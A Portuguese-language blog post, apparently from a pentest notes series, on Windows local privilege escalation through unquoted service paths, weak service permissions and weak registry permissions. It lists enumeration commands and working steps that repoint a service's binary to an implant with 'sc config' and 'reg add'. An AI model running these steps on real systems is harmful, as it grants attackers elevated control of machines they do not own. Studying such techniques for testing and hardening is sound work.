---
layout: post
title: windows priv-esc pt2
date: 2024-05-15
description: serie de windows Priv-Esc
categories: windows bhatagem
---

#### A primeira parte dessa serie teve algumas notas sobre services, permissões, privilégios, etc. 
#### Logo quando terminei a primeira vi que ja estava muita coisa pra um post só, então decidi dividir em mais duas partes, essa aqui e mais uma em breve...
#### Essa segunda parte aborda algumas tecnicas sobre priv-esc com permissões de services e também deixei algumas referências para leitura adicional.

## Insecured Objects (Non Admin Medium IL)

### Insecured Services

#### Priv Esc usando insecured objects, especificamente abusando dos Windows Services.

#### A primeira tecnica é chamada ```Insecure Service Path``` (unquoted and with spaces in paths):

- Ache services com espaços no binary path
- ``` C:\> wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """ ```


- Exploration
  - [https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#unquoted-service-paths](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#unquoted-service-paths)
  - [https://www.ired.team/offensive-security/privilege-escalation/unquoted-service-paths](https://www.ired.team/offensive-security/privilege-escalation/unquoted-service-paths)


#### A segunda tecnica é chamada de ```insecure config services``` ou ```weak services permission```

- Permite um usuário com poucos privilégios ter permissão para alterar a configuração de um service. Por exemplo, alterar o binário que um service usa quando inicia...

- Isso mostrará uma lista de cada service e os grupos que têm permissões de gravação para esse service. Fornecer um grupo limitará a saída aos serviços para os quais o grupo tem permissão de gravação:

- ``` C:\> accesschk.exe -accepteula -wuvc "Authenticated Users" * ```
- ``` C:\> accesschk.exe -accepteula -wuvc "Users" * ```
- ``` C:\> accesschk.exe -accepteula -wuvc "Everyone" * ```

- Para ver as configs do service:
- ``` C:\> sc query <service-name> ``` - lista services
- ``` C:\> sc qc <service-name> ``` - info do service


- Alterar a config e restart no service (se precisar)
- ``` sc config sshd binPath= "c:\implant\implant.exe" ```
- ``` sc start <service-name> ```

- Exploration
  - [https://juggernaut-sec.com/weak-service-permissions-windows-privilege-escalation/](https://juggernaut-sec.com/weak-service-permissions-windows-privilege-escalation/)
  - [https://www.hackingarticles.in/windows-privilege-escalation-weak-services-permission/](https://www.hackingarticles.in/windows-privilege-escalation-weak-services-permission/)
  - [https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#permissions](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#permissions)
  - [https://www.ired.team/offensive-security/privilege-escalation/weak-service-permissions](https://www.ired.team/offensive-security/privilege-escalation/weak-service-permissions)


#### A terceira tecnica é modificar permissões dos Registries (weak registry permissions)

- Lista dos services
- ``` C:\> accesschk.exe -accepteula -kwuqsw hklm\System\CurrentControlSet\services > output.txt ```
  - em um cenário real você faz download do arquivo para a attack machine e analisa "offline"

- reconfigurando services vulneraveis:

- Ver os paths do binarios:
- ``` reg query HKLM\SYSTEM\CurrentControlSet\services\ /s /v imagepath ```

- ``` reg add HKLM\SYSTEM\CurrentControlSet\services\<service-name> /v ImagePath /t REG_EXPAND_SZ /d C:\implant\implant.exe /f ```


- Exploration
  - [https://cr0mll.github.io/cyberclopaedia/Post%20Exploitation/Privilege%20Escalation/Windows/Misconfigured%20Services/Weak%20Registry%20Permissions.html](https://cr0mll.github.io/cyberclopaedia/Post%20Exploitation/Privilege%20Escalation/Windows/Misconfigured%20Services/Weak%20Registry%20Permissions.html)
  - [https://systemweakness.com/windows-privilege-escalation-weak-registry-permissions-9060c1ca7c10](https://systemweakness.com/windows-privilege-escalation-weak-registry-permissions-9060c1ca7c10)
  - [https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#services-registry-modify-permissions](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#services-registry-modify-permissions)
  - [https://www.hackingarticles.in/windows-privilege-escalation-weak-registry-permission/](https://www.hackingarticles.in/windows-privilege-escalation-weak-registry-permission/)


>___
